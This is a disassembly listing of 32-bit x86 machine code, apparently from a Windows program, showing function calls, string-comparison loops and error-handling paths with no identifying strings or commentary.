  403ba0:	e8 13 e1 00 00       	call   0x411cb8
  403ba5:	50                   	push   %eax
  403ba6:	e8 ca 28 01 00       	call   0x416475
  403bab:	83 c4 08             	add    $0x8,%esp
  403bae:	50                   	push   %eax
  403baf:	e8 f7 f3 00 00       	call   0x412fab
  403bb4:	83 c4 08             	add    $0x8,%esp
  403bb7:	68 00 80 00 00       	push   $0x8000
  403bbc:	6a 01                	push   $0x1
  403bbe:	e8 f5 e0 00 00       	call   0x411cb8
  403bc3:	50                   	push   %eax
  403bc4:	e8 ac 28 01 00       	call   0x416475
  403bc9:	83 c4 08             	add    $0x8,%esp
  403bcc:	50                   	push   %eax
  403bcd:	e8 d9 f3 00 00       	call   0x412fab
  403bd2:	6a 01                	push   $0x1
  403bd4:	e8 df e0 00 00       	call   0x411cb8
  403bd9:	50                   	push   %eax
  403bda:	e8 cb f8 00 00       	call   0x4134aa
  403bdf:	6a 02                	push   $0x2
  403be1:	e8 d2 e0 00 00       	call   0x411cb8
  403be6:	50                   	push   %eax
  403be7:	e8 be f8 00 00       	call   0x4134aa
  403bec:	83 c4 18             	add    $0x18,%esp
  403bef:	6a 00                	push   $0x0
  403bf1:	6a 00                	push   $0x0
  403bf3:	e8 c0 e0 00 00       	call   0x411cb8
  403bf8:	83 c4 04             	add    $0x4,%esp
  403bfb:	50                   	push   %eax
  403bfc:	e8 4e ec 00 00       	call   0x41284f
  403c01:	83 c4 08             	add    $0x8,%esp
  403c04:	6a 00                	push   $0x0
  403c06:	6a 01                	push   $0x1
  403c08:	e8 ab e0 00 00       	call   0x411cb8
  403c0d:	83 c4 04             	add    $0x4,%esp
  403c10:	50                   	push   %eax
  403c11:	e8 39 ec 00 00       	call   0x41284f
  403c16:	83 c4 08             	add    $0x8,%esp
  403c19:	6a 00                	push   $0x0
  403c1b:	6a 02                	push   $0x2
  403c1d:	e8 96 e0 00 00       	call   0x411cb8
  403c22:	83 c4 04             	add    $0x4,%esp
  403c25:	50                   	push   %eax
  403c26:	e8 24 ec 00 00       	call   0x41284f
  403c2b:	a1 e0 4a 43 00       	mov    0x434ae0,%eax
  403c30:	83 c4 08             	add    $0x8,%esp
  403c33:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403c39:	33 c0                	xor    %eax,%eax
  403c3b:	8b 8c 24 14 20 00 00 	mov    0x2014(%esp),%ecx
  403c42:	5f                   	pop    %edi
  403c43:	5e                   	pop    %esi
  403c44:	5d                   	pop    %ebp
  403c45:	5b                   	pop    %ebx
  403c46:	33 cc                	xor    %esp,%ecx
  403c48:	e8 ba 5b 00 00       	call   0x409807
  403c4d:	81 c4 08 20 00 00    	add    $0x2008,%esp
  403c53:	c3                   	ret
  403c54:	56                   	push   %esi
  403c55:	68 28 79 42 00       	push   $0x427928
  403c5a:	e8 f1 de ff ff       	call   0x401b50
  403c5f:	83 c4 08             	add    $0x8,%esp
  403c62:	83 c8 ff             	or     $0xffffffff,%eax
  403c65:	eb d4                	jmp    0x403c3b
  403c67:	90                   	nop
  403c68:	71 3b                	jno    0x403ca5
  403c6a:	40                   	inc    %eax
  403c6b:	00 38                	add    %bh,(%eax)
  403c6d:	3b 40 00             	cmp    0x0(%eax),%eax
  403c70:	31 3b                	xor    %edi,(%ebx)
  403c72:	40                   	inc    %eax
  403c73:	00 2a                	add    %ch,(%edx)
  403c75:	3b 40 00             	cmp    0x0(%eax),%eax
  403c78:	7c 3b                	jl     0x403cb5
  403c7a:	40                   	inc    %eax
  403c7b:	00 00                	add    %al,(%eax)
  403c7d:	04 04                	add    $0x4,%al
  403c7f:	04 04                	add    $0x4,%al
  403c81:	04 04                	add    $0x4,%al
  403c83:	04 01                	add    $0x1,%al
  403c85:	04 04                	add    $0x4,%al
  403c87:	04 04                	add    $0x4,%al
  403c89:	04 04                	add    $0x4,%al
  403c8b:	04 04                	add    $0x4,%al
  403c8d:	04 04                	add    $0x4,%al
  403c8f:	04 04                	add    $0x4,%al
  403c91:	04 04                	add    $0x4,%al
  403c93:	04 04                	add    $0x4,%al
  403c95:	04 04                	add    $0x4,%al
  403c97:	04 04                	add    $0x4,%al
  403c99:	04 04                	add    $0x4,%al
  403c9b:	04 04                	add    $0x4,%al
  403c9d:	04 04                	add    $0x4,%al
  403c9f:	04 04                	add    $0x4,%al
  403ca1:	04 02                	add    $0x2,%al
  403ca3:	03 cc                	add    %esp,%ecx
  403ca5:	cc                   	int3
  403ca6:	cc                   	int3
  403ca7:	cc                   	int3
  403ca8:	cc                   	int3
  403ca9:	cc                   	int3
  403caa:	cc                   	int3
  403cab:	cc                   	int3
  403cac:	cc                   	int3
  403cad:	cc                   	int3
  403cae:	cc                   	int3
  403caf:	cc                   	int3
  403cb0:	53                   	push   %ebx
  403cb1:	56                   	push   %esi
  403cb2:	68 70 79 42 00       	push   $0x427970
  403cb7:	e8 14 1c 00 00       	call   0x4058d0
  403cbc:	8b f0                	mov    %eax,%esi
  403cbe:	83 c4 04             	add    $0x4,%esp
  403cc1:	85 f6                	test   %esi,%esi
  403cc3:	74 72                	je     0x403d37
  403cc5:	ba 7c 79 42 00       	mov    $0x42797c,%edx
  403cca:	8b ce                	mov    %esi,%ecx
  403ccc:	0f 1f 40 00          	nopl   0x0(%eax)
  403cd0:	8a 01                	mov    (%ecx),%al
  403cd2:	3a 02                	cmp    (%edx),%al
  403cd4:	75 1a                	jne    0x403cf0
  403cd6:	84 c0                	test   %al,%al
  403cd8:	74 12                	je     0x403cec
  403cda:	8a 41 01             	mov    0x1(%ecx),%al
  403cdd:	3a 42 01             	cmp    0x1(%edx),%al
  403ce0:	75 0e                	jne    0x403cf0
  403ce2:	83 c1 02             	add    $0x2,%ecx
  403ce5:	83 c2 02             	add    $0x2,%edx
  403ce8:	84 c0                	test   %al,%al
  403cea:	75 e4                	jne    0x403cd0
  403cec:	33 c0                	xor    %eax,%eax
  403cee:	eb 05                	jmp    0x403cf5
  403cf0:	1b c0                	sbb    %eax,%eax
  403cf2:	83 c8 01             	or     $0x1,%eax
  403cf5:	85 c0                	test   %eax,%eax
  403cf7:	74 3e                	je     0x403d37
  403cf9:	b9 f0 68 42 00       	mov    $0x4268f0,%ecx
  403cfe:	8b c6                	mov    %esi,%eax
  403d00:	8a 10                	mov    (%eax),%dl
  403d02:	3a 11                	cmp    (%ecx),%dl
  403d04:	75 1a                	jne    0x403d20
  403d06:	84 d2                	test   %dl,%dl
  403d08:	74 12                	je     0x403d1c
  403d0a:	8a 50 01             	mov    0x1(%eax),%dl
  403d0d:	3a 51 01             	cmp    0x1(%ecx),%dl
  403d10:	75 0e                	jne    0x403d20
  403d12:	83 c0 02             	add    $0x2,%eax
  403d15:	83 c1 02             	add    $0x2,%ecx
  403d18:	84 d2                	test   %dl,%dl
  403d1a:	75 e4                	jne    0x403d00
  403d1c:	33 c0                	xor    %eax,%eax
  403d1e:	eb 05                	jmp    0x403d25
  403d20:	1b c0                	sbb    %eax,%eax
  403d22:	83 c8 01             	or     $0x1,%eax
  403d25:	85 c0                	test   %eax,%eax
  403d27:	74 4d                	je     0x403d76
  403d29:	56                   	push   %esi
  403d2a:	68 80 79 42 00       	push   $0x427980
  403d2f:	e8 1c de ff ff       	call   0x401b50
  403d34:	83 c4 08             	add    $0x8,%esp
  403d37:	a1 e4 4a 43 00       	mov    0x434ae4,%eax
  403d3c:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403d42:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403d46:	68 00 10 00 00       	push   $0x1000
  403d4b:	8d 83 70 10 00 00    	lea    0x1070(%ebx),%eax
  403d51:	50                   	push   %eax
  403d52:	68 08 fc 43 00       	push   $0x43fc08
  403d57:	e8 34 2b 00 00       	call   0x406890
  403d5c:	83 c4 0c             	add    $0xc,%esp
  403d5f:	85 c0                	test   %eax,%eax
  403d61:	75 20                	jne    0x403d83
  403d63:	68 e0 79 42 00       	push   $0x4279e0
  403d68:	e8 e3 dd ff ff       	call   0x401b50
  403d6d:	83 c4 04             	add    $0x4,%esp
  403d70:	83 c8 ff             	or     $0xffffffff,%eax
  403d73:	5e                   	pop    %esi
  403d74:	5b                   	pop    %ebx
  403d75:	c3                   	ret
  403d76:	a1 e4 4a 43 00       	mov    0x434ae4,%eax
  403d7b:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403d81:	eb bf                	jmp    0x403d42
  403d83:	8b 35 f8 4a 43 00    	mov    0x434af8,%esi
  403d89:	8b ce                	mov    %esi,%ecx
  403d8b:	57                   	push   %edi
  403d8c:	68 08 fc 43 00       	push   $0x43fc08
  403d91:	ff 15 8c 61 42 00    	call   *0x42618c
  403d97:	ff d6                	call   *%esi
  403d99:	68 00 10 00 00       	push   $0x1000
  403d9e:	8d bb 70 40 00 00    	lea    0x4070(%ebx),%edi
  403da4:	57                   	push   %edi
  403da5:	68 00 dc 43 00       	push   $0x43dc00
  403daa:	e8 e1 2a 00 00       	call   0x406890
  403daf:	83 c4 10             	add    $0x10,%esp
  403db2:	85 c0                	test   %eax,%eax
  403db4:	75 14                	jne    0x403dca
  403db6:	68 08 7a 42 00       	push   $0x427a08
  403dbb:	e8 90 dd ff ff       	call   0x401b50
  403dc0:	83 c4 04             	add    $0x4,%esp
  403dc3:	83 c8 ff             	or     $0xffffffff,%eax
  403dc6:	5f                   	pop    %edi
  403dc7:	5e                   	pop    %esi
  403dc8:	5b                   	pop    %ebx
  403dc9:	c3                   	ret
  403dca:	8b 35 fc 4a 43 00    	mov    0x434afc,%esi
  403dd0:	8b ce                	mov    %esi,%ecx
  403dd2:	68 00 dc 43 00       	push   $0x43dc00
  403dd7:	ff 15 8c 61 42 00    	call   *0x42618c
  403ddd:	ff d6                	call   *%esi
  403ddf:	57                   	push   %edi
  403de0:	6a 3b                	push   $0x3b
  403de2:	68 30 7a 42 00       	push   $0x427a30
  403de7:	6a 5c                	push   $0x5c
  403de9:	57                   	push   %edi
  403dea:	6a 3b                	push   $0x3b
  403dec:	68 3c 7a 42 00       	push   $0x427a3c
  403df1:	6a 5c                	push   $0x5c
  403df3:	57                   	push   %edi
  403df4:	68 50 7a 42 00       	push   $0x427a50
  403df9:	68 20 30 00 00       	push   $0x3020
  403dfe:	68 a0 4b 43 00       	push   $0x434ba0
  403e03:	e8 98 dc ff ff       	call   0x401aa0
  403e08:	83 c4 34             	add    $0x34,%esp
  403e0b:	68 20 30 00 00       	push   $0x3020
  403e10:	3d 20 30 00 00       	cmp    $0x3020,%eax
  403e15:	7c 15                	jl     0x403e2c
  403e17:	57                   	push   %edi
  403e18:	68 64 7a 42 00       	push   $0x427a64
  403e1d:	e8 2e dd ff ff       	call   0x401b50
  403e22:	83 c4 0c             	add    $0xc,%esp
  403e25:	83 c8 ff             	or     $0xffffffff,%eax
  403e28:	5f                   	pop    %edi
  403e29:	5e                   	pop    %esi
  403e2a:	5b                   	pop    %ebx
  403e2b:	c3                   	ret
  403e2c:	68 a0 4b 43 00       	push   $0x434ba0
  403e31:	68 c0 7b 43 00       	push   $0x437bc0
  403e36:	e8 55 2a 00 00       	call   0x406890
  403e3b:	83 c4 0c             	add    $0xc,%esp
  403e3e:	85 c0                	test   %eax,%eax
  403e40:	75 14                	jne    0x403e56
  403e42:	68 98 7a 42 00       	push   $0x427a98
  403e47:	e8 04 dd ff ff       	call   0x401b50
  403e4c:	83 c4 04             	add    $0x4,%esp
  403e4f:	83 c8 ff             	or     $0xffffffff,%eax
  403e52:	5f                   	pop    %edi
  403e53:	5e                   	pop    %esi
  403e54:	5b                   	pop    %ebx
  403e55:	c3                   	ret
  403e56:	8b 35 04 4b 43 00    	mov    0x434b04,%esi
  403e5c:	8b ce                	mov    %esi,%ecx
  403e5e:	ff 15 8c 61 42 00    	call   *0x42618c
  403e64:	ff d6                	call   *%esi
  403e66:	8b 35 00 4b 43 00    	mov    0x434b00,%esi
  403e6c:	8b ce                	mov    %esi,%ecx
  403e6e:	68 c0 7b 43 00       	push   $0x437bc0
  403e73:	ff 15 8c 61 42 00    	call   *0x42618c
  403e79:	ff d6                	call   *%esi
  403e7b:	53                   	push   %ebx
  403e7c:	e8 ff fb ff ff       	call   0x403a80
  403e81:	8b 35 e8 4a 43 00    	mov    0x434ae8,%esi
  403e87:	83 c4 08             	add    $0x8,%esp
  403e8a:	8b ce                	mov    %esi,%ecx
  403e8c:	ff 15 8c 61 42 00    	call   *0x42618c
  403e92:	ff d6                	call   *%esi
  403e94:	8b 35 08 4b 43 00    	mov    0x434b08,%esi
  403e9a:	8b ce                	mov    %esi,%ecx
  403e9c:	68 c0 7b 43 00       	push   $0x437bc0
  403ea1:	ff 15 8c 61 42 00    	call   *0x42618c
  403ea7:	ff d6                	call   *%esi
  403ea9:	ff b3 7c 50 00 00    	push   0x507c(%ebx)
  403eaf:	ff b3 78 50 00 00    	push   0x5078(%ebx)
  403eb5:	e8 26 2b 00 00       	call   0x4069e0
  403eba:	8b f8                	mov    %eax,%edi
  403ebc:	83 c4 0c             	add    $0xc,%esp
  403ebf:	85 ff                	test   %edi,%edi
  403ec1:	74 6e                	je     0x403f31
  403ec3:	8b 35 0c 4b 43 00    	mov    0x434b0c,%esi
  403ec9:	8b ce                	mov    %esi,%ecx
  403ecb:	6a 00                	push   $0x0
  403ecd:	57                   	push   %edi
  403ece:	ff b3 78 50 00 00    	push   0x5078(%ebx)
  403ed4:	ff 15 8c 61 42 00    	call   *0x42618c
  403eda:	ff d6                	call   *%esi
  403edc:	8b 07                	mov    (%edi),%eax
  403ede:	83 c4 0c             	add    $0xc,%esp
  403ee1:	8b f7                	mov    %edi,%esi
  403ee3:	85 c0                	test   %eax,%eax
  403ee5:	74 13                	je     0x403efa
  403ee7:	50                   	push   %eax
  403ee8:	e8 5b dc 00 00       	call   0x411b48
  403eed:	8b 46 04             	mov    0x4(%esi),%eax
  403ef0:	8d 76 04             	lea    0x4(%esi),%esi
  403ef3:	83 c4 04             	add    $0x4,%esp
  403ef6:	85 c0                	test   %eax,%eax
  403ef8:	75 ed                	jne    0x403ee7
  403efa:	57                   	push   %edi
  403efb:	e8 48 dc 00 00       	call   0x411b48
  403f00:	8b 35 48 4b 43 00    	mov    0x434b48,%esi
  403f06:	83 c4 04             	add    $0x4,%esp
  403f09:	8b ce                	mov    %esi,%ecx
  403f0b:	ff 15 8c 61 42 00    	call   *0x42618c
  403f11:	ff d6                	call   *%esi
  403f13:	85 c0                	test   %eax,%eax
  403f15:	74 14                	je     0x403f2b
  403f17:	68 c0 7a 42 00       	push   $0x427ac0
  403f1c:	e8 2f dc ff ff       	call   0x401b50
  403f21:	83 c4 04             	add    $0x4,%esp
  403f24:	83 c8 ff             	or     $0xffffffff,%eax
  403f27:	5f                   	pop    %edi
  403f28:	5e                   	pop    %esi
  403f29:	5b                   	pop    %ebx
  403f2a:	c3                   	ret
  403f2b:	5f                   	pop    %edi
  403f2c:	5e                   	pop    %esi
  403f2d:	33 c0                	xor    %eax,%eax
  403f2f:	5b                   	pop    %ebx
  403f30:	c3                   	ret
  403f31:	68 bc 79 42 00       	push   $0x4279bc
  403f36:	e8 15 dc ff ff       	call   0x401b50
  403f3b:	83 c4 04             	add    $0x4,%esp
  403f3e:	83 c8 ff             	or     $0xffffffff,%eax
  403f41:	5f                   	pop    %edi
  403f42:	5e                   	pop    %esi
  403f43:	5b                   	pop    %ebx
  403f44:	c3                   	ret
  403f45:	cc                   	int3
  403f46:	cc                   	int3
  403f47:	cc                   	int3
  403f48:	cc                   	int3
  403f49:	cc                   	int3
  403f4a:	cc                   	int3
  403f4b:	cc                   	int3
  403f4c:	cc                   	int3
  403f4d:	cc                   	int3
  403f4e:	cc                   	int3
  403f4f:	cc                   	int3
  403f50:	8b 44 24 08          	mov    0x8(%esp),%eax
  403f54:	56                   	push   %esi
  403f55:	8b 35 6c 1c 44 00    	mov    0x441c6c,%esi
  403f5b:	83 c0 12             	add    $0x12,%eax
  403f5e:	6a 01                	push   $0x1
  403f60:	50                   	push   %eax
  403f61:	8b 44 24 10          	mov    0x10(%esp),%eax
  403f65:	8b ce                	mov    %esi,%ecx
  403f67:	6a 00                	push   $0x0
  403f69:	68 ec 7d 42 00       	push   $0x427dec
  403f6e:	ff 30                	push   (%eax)
  403f70:	ff 15 8c 61 42 00    	call   *0x42618c
  403f76:	ff d6                	call   *%esi
  403f78:	83 c4 14             	add    $0x14,%esp
  403f7b:	33 c0                	xor    %eax,%eax
  403f7d:	5e                   	pop    %esi
  403f7e:	c3                   	ret
  403f7f:	cc                   	int3
  403f80:	53                   	push   %ebx
  403f81:	56                   	push   %esi
  403f82:	57                   	push   %edi
  403f83:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403f87:	33 db                	xor    %ebx,%ebx
  403f89:	8b 77 18             	mov    0x18(%edi),%esi
  403f8c:	85 f6                	test   %esi,%esi
  403f8e:	74 15                	je     0x403fa5
  403f90:	ff 77 1c             	push   0x1c(%edi)
  403f93:	8b ce                	mov    %esi,%ecx
  403f95:	ff 77 08             	push   0x8(%edi)
  403f98:	ff 15 8c 61 42 00    	call   *0x42618c
  403f9e:	ff d6                	call   *%esi
  403fa0:	83 c4 08             	add    $0x8,%esp
  403fa3:	8b d8                	mov    %eax,%ebx
  403fa5:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  403fa9:	75 4b                	jne    0x403ff6
  403fab:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  403fb1:	8b ce                	mov    %esi,%ecx
  403fb3:	68 10 1c 44 00       	push   $0x441c10
  403fb8:	ff 15 8c 61 42 00    	call   *0x42618c
  403fbe:	ff d6                	call   *%esi
  403fc0:	8b 47 14             	mov    0x14(%edi),%eax
  403fc3:	83 c4 04             	add    $0x4,%esp
  403fc6:	89 18                	mov    %ebx,(%eax)
  403fc8:	ff 77 10             	push   0x10(%edi)
  403fcb:	8b 35 58 1c 44 00    	mov    0x441c58,%esi
  403fd1:	8b ce                	mov    %esi,%ecx
  403fd3:	ff 15 8c 61 42 00    	call   *0x42618c
  403fd9:	ff d6                	call   *%esi
  403fdb:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  403fe1:	83 c4 04             	add    $0x4,%esp
  403fe4:	8b ce                	mov    %esi,%ecx
  403fe6:	68 10 1c 44 00       	push   $0x441c10
  403feb:	ff 15 8c 61 42 00    	call   *0x42618c
  403ff1:	ff d6                	call   *%esi
  403ff3:	83 c4 04             	add    $0x4,%esp
  403ff6:	5f                   	pop    %edi
  403ff7:	5e                   	pop    %esi
  403ff8:	b8 01 00 00 00       	mov    $0x1,%eax
  403ffd:	5b                   	pop    %ebx
  403ffe:	c3                   	ret
  403fff:	cc                   	int3
  404000:	51                   	push   %ecx
  404001:	55                   	push   %ebp
  404002:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  404006:	56                   	push   %esi
  404007:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  40400d:	8b ce                	mov    %esi,%ecx
  40400f:	57                   	push   %edi
  404010:	68 0c 1c 44 00       	push   $0x441c0c
  404015:	ff 15 8c 61 42 00    	call   *0x42618c
  40401b:	ff d6                	call   *%esi
  40401d:	8b 35 2c 1c 44 00    	mov    0x441c2c,%esi
  404023:	83 c4 04             	add    $0x4,%esp
  404026:	8b ce                	mov    %esi,%ecx
  404028:	c7 05 24 1c 44 00 00 	movl   $0x0,0x441c24
  40402f:	00 00 00 
  404032:	ff 15 8c 61 42 00    	call   *0x42618c
  404038:	ff d6                	call   *%esi
  40403a:	83 7d 04 00          	cmpl   $0x0,0x4(%ebp)
  40403e:	89 45 00             	mov    %eax,0x0(%ebp)
  404041:	75 13                	jne    0x404056
  404043:	8b 35 48 1c 44 00    	mov    0x441c48,%esi
  404049:	8b ce                	mov    %esi,%ecx
  40404b:	ff 15 8c 61 42 00    	call   *0x42618c
  404051:	ff d6                	call   *%esi
  404053:	89 45 04             	mov    %eax,0x4(%ebp)
  404056:	8b 35 70 1c 44 00    	mov    0x441c70,%esi
  40405c:	8b ce                	mov    %esi,%ecx
  40405e:	53                   	push   %ebx
  40405f:	6a 00                	push   $0x0
  404061:	55                   	push   %ebp
  404062:	68 f0 43 40 00       	push   $0x4043f0
  404067:	68 14 7e 42 00       	push   $0x427e14
  40406c:	ff 75 00             	push   0x0(%ebp)
  40406f:	ff 15 8c 61 42 00    	call   *0x42618c
  404075:	ff d6                	call   *%esi
  404077:	8b 35 70 1c 44 00    	mov    0x441c70,%esi
  40407d:	83 c4 14             	add    $0x14,%esp
  404080:	f7 d8                	neg    %eax
  404082:	8b ce                	mov    %esi,%ecx
  404084:	1b ff                	sbb    %edi,%edi
  404086:	6a 00                	push   $0x0
  404088:	55                   	push   %ebp
  404089:	68 10 44 40 00       	push   $0x404410
  40408e:	68 1c 7e 42 00       	push   $0x427e1c
  404093:	ff 75 00             	push   0x0(%ebp)
  404096:	47                   	inc    %edi
  404097:	ff 15 8c 61 42 00    	call   *0x42618c
  40409d:	ff d6                	call   *%esi
  40409f:	8b 35 70 1c 44 00    	mov    0x441c70,%esi
  4040a5:	83 c4 14             	add    $0x14,%esp
  4040a8:	f7 d8                	neg    %eax
  4040aa:	8b ce                	mov    %esi,%ecx
  4040ac:	1b db                	sbb    %ebx,%ebx
  4040ae:	6a 00                	push   $0x0
  4040b0:	55                   	push   %ebp
  4040b1:	68 00 44 40 00       	push   $0x404400
  4040b6:	68 2c 7e 42 00       	push   $0x427e2c
  4040bb:	ff 75 00             	push   0x0(%ebp)
  4040be:	43                   	inc    %ebx
  4040bf:	0b df                	or     %edi,%ebx
  4040c1:	ff 15 8c 61 42 00    	call   *0x42618c
  4040c7:	ff d6                	call   *%esi
  4040c9:	8b 35 8c 1c 44 00    	mov    0x441c8c,%esi
  4040cf:	83 c4 14             	add    $0x14,%esp
  4040d2:	85 c0                	test   %eax,%eax
  4040d4:	b9 01 00 00 00       	mov    $0x1,%ecx
  4040d9:	0f 44 d9             	cmove  %ecx,%ebx
  4040dc:	8b ce                	mov    %esi,%ecx
  4040de:	6a 00                	push   $0x0
  4040e0:	6a ff                	push   $0xffffffff
  4040e2:	68 34 7e 42 00       	push   $0x427e34
  4040e7:	ff 75 00             	push   0x0(%ebp)
  4040ea:	ff 15 8c 61 42 00    	call   *0x42618c
  4040f0:	ff d6                	call   *%esi
  4040f2:	8b 35 70 1c 44 00    	mov    0x441c70,%esi
  4040f8:	83 c4 10             	add    $0x10,%esp
  4040fb:	8b ce                	mov    %esi,%ecx
  4040fd:	6a 00                	push   $0x0
  4040ff:	55                   	push   %ebp
  404100:	68 f0 44 40 00       	push   $0x4044f0
  404105:	68 50 7e 42 00       	push   $0x427e50
  40410a:	ff 75 00             	push   0x0(%ebp)
  40410d:	ff 15 8c 61 42 00    	call   *0x42618c
  404113:	ff d6                	call   *%esi
  404115:	83 c4 14             	add    $0x14,%esp
  404118:	f7 d8                	neg    %eax
  40411a:	1b c0                	sbb    %eax,%eax
  40411c:	40                   	inc    %eax
  40411d:	0b c3                	or     %ebx,%eax
  40411f:	8b 45 00             	mov    0x0(%ebp),%eax
  404122:	5b                   	pop    %ebx
  404123:	50                   	push   %eax
  404124:	75 61                	jne    0x404187
  404126:	8b 35 28 1c 44 00    	mov    0x441c28,%esi
  40412c:	8b ce                	mov    %esi,%ecx
  40412e:	ff 15 8c 61 42 00    	call   *0x42618c
  404134:	ff d6                	call   *%esi
  404136:	8b f8                	mov    %eax,%edi
  404138:	83 c4 04             	add    $0x4,%esp
  40413b:	85 ff                	test   %edi,%edi
  40413d:	74 2a                	je     0x404169
  40413f:	ff 75 00             	push   0x0(%ebp)
  404142:	8b 35 84 1c 44 00    	mov    0x441c84,%esi
  404148:	8b ce                	mov    %esi,%ecx
  40414a:	ff 15 8c 61 42 00    	call   *0x42618c
  404150:	ff d6                	call   *%esi
  404152:	8b 35 74 1c 44 00    	mov    0x441c74,%esi
  404158:	83 c4 04             	add    $0x4,%esp
  40415b:	8b ce                	mov    %esi,%ecx
  40415d:	50                   	push   %eax
  40415e:	ff 15 8c 61 42 00    	call   *0x42618c
  404164:	ff d6                	call   *%esi
  404166:	83 c4 04             	add    $0x4,%esp
  404169:	ff 75 00             	push   0x0(%ebp)
  40416c:	8b 35 9c 1c 44 00    	mov    0x441c9c,%esi
  404172:	8b ce                	mov    %esi,%ecx
  404174:	ff 15 8c 61 42 00    	call   *0x42618c
  40417a:	ff d6                	call   *%esi
  40417c:	83 c4 04             	add    $0x4,%esp
  40417f:	0b f8                	or     %eax,%edi
  404181:	8b 45 00             	mov    0x0(%ebp),%eax
  404184:	74 2d                	je     0x4041b3
  404186:	50                   	push   %eax
  404187:	8b 35 84 1c 44 00    	mov    0x441c84,%esi
  40418d:	8b ce                	mov    %esi,%ecx
  40418f:	ff 15 8c 61 42 00    	call   *0x42618c
  404195:	ff d6                	call   *%esi
  404197:	8b 35 74 1c 44 00    	mov    0x441c74,%esi
  40419d:	83 c4 04             	add    $0x4,%esp
  4041a0:	8b ce                	mov    %esi,%ecx
  4041a2:	50                   	push   %eax
  4041a3:	ff 15 8c 61 42 00    	call   *0x42618c
  4041a9:	ff d6                	call   *%esi
  4041ab:	83 c4 04             	add    $0x4,%esp
  4041ae:	e9 70 01 00 00       	jmp    0x404323
  4041b3:	8b 35 68 1c 44 00    	mov    0x441c68,%esi
  4041b9:	8b ce                	mov    %esi,%ecx
  4041bb:	6a 01                	push   $0x1
  4041bd:	6a 00                	push   $0x0
  4041bf:	68 58 7e 42 00       	push   $0x427e58
  4041c4:	50                   	push   %eax
  4041c5:	ff 15 8c 61 42 00    	call   *0x42618c
  4041cb:	ff d6                	call   *%esi
  4041cd:	8b 35 68 1c 44 00    	mov    0x441c68,%esi
  4041d3:	83 c4 10             	add    $0x10,%esp
  4041d6:	8b ce                	mov    %esi,%ecx
  4041d8:	6a 01                	push   $0x1
  4041da:	6a 00                	push   $0x0
  4041dc:	68 68 7e 42 00       	push   $0x427e68
  4041e1:	ff 75 00             	push   0x0(%ebp)
  4041e4:	ff 15 8c 61 42 00    	call   *0x42618c
  4041ea:	ff d6                	call   *%esi
  4041ec:	8b 35 7c 1c 44 00    	mov    0x441c7c,%esi
  4041f2:	83 c4 10             	add    $0x10,%esp
  4041f5:	8b ce                	mov    %esi,%ecx
  4041f7:	ff b5 14 40 00 00    	push   0x4014(%ebp)
  4041fd:	ff b5 10 40 00 00    	push   0x4010(%ebp)
  404203:	ff 15 8c 61 42 00    	call   *0x42618c
  404209:	ff d6                	call   *%esi
  40420b:	8b 35 80 1c 44 00    	mov    0x441c80,%esi
  404211:	83 c4 08             	add    $0x8,%esp
  404214:	8b ce                	mov    %esi,%ecx
  404216:	6a 01                	push   $0x1
  404218:	50                   	push   %eax
  404219:	6a 00                	push   $0x0
  40421b:	68 78 7e 42 00       	push   $0x427e78
  404220:	ff 75 00             	push   0x0(%ebp)
  404223:	ff 15 8c 61 42 00    	call   *0x42618c
  404229:	ff d6                	call   *%esi
  40422b:	ff b5 10 40 00 00    	push   0x4010(%ebp)
  404231:	e8 12 d9 00 00       	call   0x411b48
  404236:	83 c4 18             	add    $0x18,%esp
  404239:	c7 85 10 40 00 00 00 	movl   $0x0,0x4010(%ebp)
  404240:	00 00 00 
  404243:	8b 35 8c 1c 44 00    	mov    0x441c8c,%esi
  404249:	8b ce                	mov    %esi,%ecx
  40424b:	6a 01                	push   $0x1
  40424d:	ff b5 0c 40 00 00    	push   0x400c(%ebp)
  404253:	ff b5 08 40 00 00    	push   0x4008(%ebp)
  404259:	ff 75 00             	push   0x0(%ebp)
  40425c:	ff 15 8c 61 42 00    	call   *0x42618c
  404262:	ff d6                	call   *%esi
  404264:	83 c4 10             	add    $0x10,%esp
  404267:	85 c0                	test   %eax,%eax
  404269:	74 2a                	je     0x404295
  40426b:	ff 75 00             	push   0x0(%ebp)
  40426e:	8b 35 84 1c 44 00    	mov    0x441c84,%esi
  404274:	8b ce                	mov    %esi,%ecx
  404276:	ff 15 8c 61 42 00    	call   *0x42618c
  40427c:	ff d6                	call   *%esi
  40427e:	8b 35 74 1c 44 00    	mov    0x441c74,%esi
  404284:	83 c4 04             	add    $0x4,%esp
  404287:	8b ce                	mov    %esi,%ecx
  404289:	50                   	push   %eax
  40428a:	ff 15 8c 61 42 00    	call   *0x42618c
  404290:	ff d6                	call   *%esi
  404292:	83 c4 04             	add    $0x4,%esp
  404295:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  40429b:	8b ce                	mov    %esi,%ecx
  40429d:	68 14 1c 44 00       	push   $0x441c14
  4042a2:	ff 15 8c 61 42 00    	call   *0x42618c
  4042a8:	ff d6                	call   *%esi
  4042aa:	8b 35 58 1c 44 00    	mov    0x441c58,%esi
  4042b0:	83 c4 04             	add    $0x4,%esp
  4042b3:	8b ce                	mov    %esi,%ecx
  4042b5:	68 18 1c 44 00       	push   $0x441c18
  4042ba:	ff 15 8c 61 42 00    	call   *0x42618c
  4042c0:	ff d6                	call   *%esi
  4042c2:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  4042c8:	83 c4 04             	add    $0x4,%esp
  4042cb:	8b ce                	mov    %esi,%ecx
  4042cd:	68 14 1c 44 00       	push   $0x441c14
  4042d2:	ff 15 8c 61 42 00    	call   *0x42618c
  4042d8:	ff d6                	call   *%esi
  4042da:	8b 35 a0 1c 44 00    	mov    0x441ca0,%esi
  4042e0:	83 c4 04             	add    $0x4,%esp
  4042e3:	8b ce                	mov    %esi,%ecx
  4042e5:	ff 15 8c 61 42 00    	call   *0x42618c
  4042eb:	ff d6                	call   *%esi
  4042ed:	85 c0                	test   %eax,%eax
  4042ef:	7e 32                	jle    0x404323
  4042f1:	83 3d 24 1c 44 00 00 	cmpl   $0x0,0x441c24
  4042f8:	75 29                	jne    0x404323
